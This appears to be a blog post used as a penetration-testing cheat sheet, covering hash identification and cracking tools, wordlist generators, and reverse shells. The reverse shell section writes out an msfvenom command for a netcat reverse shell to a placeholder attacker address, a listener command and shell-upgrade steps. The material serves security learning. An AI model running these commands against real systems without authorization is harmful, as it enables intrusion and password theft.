---
layout: post
title:  "PenTest Wiki"
date:   2023-08-27 08:36:00 +0200
categories: wiki
sticky: true
permalink: /wiki/
---

* TOC
{:toc}

---

## Hashes

### Hash identification
[Haiti](https://noraj.github.io/haiti/) is a hash identifier that is available both as a CLI tool and as a library that also supports Hashcat and John The Ripper.

**Usage**: haiti \[options\] \<hashes>

Here are some useful options:
* **-e**, **\-\-extended**: lists all possible hash algorithms including salted ones
* **\-\-short**: does not display Hashcat or John The Ripper references

### Hash cracking

#### Hashcat
Hashcat is a tool for cracking hashes.

##### Usage
hashcat \[OPTIONS\] \<hash, hashfile> \[wordlist\]

##### Useful options
* **-a ATTACK_MODE**: specifies an attack mode
* **-m HASH_TYPE**: specifies a hash type

#### John The Ripper
John the Ripper is a tool for cracking hashes.

##### Usage
john \[OPTIONS\] \[PASSWORD-FILES\]

##### Useful options

* **\-\-wordlist=/path/to/wordlist**: specifies a wordlist file
* **\-\-rules=RULESET_NAME**: specifies a set of rules to use while cracking
* **\-\-format=HASH_TYPE**: specifies the type of the hash

---

## Reverse shell

A **reverse shell** is a shell connection from the target machine to the attacker machine.

### Reverse shell generation

It is possible to use **msfvenom** to generate appropriate one-liner commands. The following command lists all the available payloads, filters the ones that are not **cmd/unix** and prints only their name:

{% highlight bash%}

msfvenom -l payloads | grep "cmd/unix" | awk {'print $1'}

{% endhighlight %}

These payloads can be used to generate the needed command. For example, the following command will generate a one-liner netcat command for the specified parameters

{% highlight bash%}

msfvenom -p cmd/unix/reverse_netcat LHOST=1.2.3.4 LPORT=4444

{% endhighlight %}

The reverse shells must be caught on the attacker machine by listening on the specified port (**nc -lvnp 4444**).

### Upgrading a dumb shell to a fully interactive shell

Reverse shells are usually lacking core functionalities such as no tab-complete, no command history with the up arrow, and the inability to use some commands (**su**, **ssh**, text editors).

However, it is possible to upgrade these shells to fully interactive ones. Running the following command will spawn a pseudo-terminal that can help when running some commands:

{% highlight bash %}

python -c 'import pty; pty.spawn("/bin/bash")'

{% endhighlight %}

Then, some options must be set in the attacking machine's terminal. After starting the pseudo-shell with Python, background it with **CTRL + Z**. Then, some information about the terminal must be known:
* the **TERM** type can be printed with **echo $TERM**
* the size of the **TTY** can be printed (along with other information) with **stty -a**.

After that, the **STTY** type can be set to **raw** and the shell can be foregrounded with **stty raw -echo; fg**. Then some variables must be set. Assuming that **TERM=xterm256-color** and the **STTY rows** and **columns** are respectively **38** and **116**:
* **export SHELL=bash**
* **export TERM=xterm256-color**
* **stty rows 38 columns 116**

If necessary, run **reset** to have a properly functional shell.
#### TL;DR

1. python -c \'import pty; pty.spawn(\"/bin/bash\")\'
2. CTRL + Z
3. echo $TERM (assume it echoes **X**)
4. stty -a (assume it echoes rows **Y**; columns **Z**)
5. stty raw -echo; fg
6. export SHELL=bash
7. export TERM=**X**
8. stty rows **Y** columns **Z**
9. reset (**optional**)

---

## Wordlists

### Wordlistctl

[Wordlistctl](https://github.com/BlackArch/wordlistctl) is a script that allows to easily install wordlists.

#### Installation

To install on non-Arch systems:

{% highlight bash %}

mkdir wordlistctl && cd wordlistctl
curl https://raw.githubusercontent.com/BlackArch/wordlistctl/master/requirements.txt > requirements.txt
curl https://raw.githubusercontent.com/BlackArch/wordlistctl/master/repo.json > repo.json
curl https://raw.githubusercontent.com/BlackArch/wordlistctl/master/wordlistctl.py > wordlistctl
pip3 install -r requirements.txt
chmod +x wordlistctl
{% endhighlight %}

#### Usage

wordlistctl \<fetch, search, list> \<wordlist>

* **search**: searches for a wordlist by name
* **fetch**: installs a wordlist by name
* **list**: prints wordlists names

#### Useful flags:
* **-g** \<category>: downloads (when used with **fetch**) or prints (when used with **list**) *category* wordlists names (*e.g.* **wordlistctl list -g usernames** prints names of the wordlists that can be used to crack usernames)

### Mentalist

[Mentalist](https://github.com/sc0tfree/mentalist) is a tool for wordlist generation that can be used to expand an already existing wordlist.

It has a **GUI** which allows to easily add **Case**, **Substitution** and **Append/Prepend** rules.

### CEWL
[CeWL](https://github.com/digininja/CeWL) is a tool that spiders a given URL and returns a list of words that can be used with password crackers.

#### Usage

cewl \[OPTIONS\] \<URL>

#### Useful flags:
* **-d <DEPTH>**: specifies a depth for spidering
* **-m \-\-min_word_length MIN_WORD_LENGTH**: specifies the minimum word length
* **-x, \-\-max_word_length MAX_WORD_LENGTH**: specifies the maximum word length
* **-o, \-\-offsite**: allows the spider to visit other websites
* **-w, \-\-write FILENAME**: writes the output to a file

### Ttpassgen
[ttpassgen](https://github.com/tp7309/TTPassGen) is a tool for wordlist generation.

#### Usage

ttpassgen [OPTIONS] OUTPUT

#### Useful flags:

* **-m, \-\-mode MODE_NUMBER**: specifies the generation mode
* **-d, \-\-dictlist WORDLIST**: read wordlists from files
* **-r, \-\-rule RULES**: allows for rule specification, also referring to previously specified wordlist files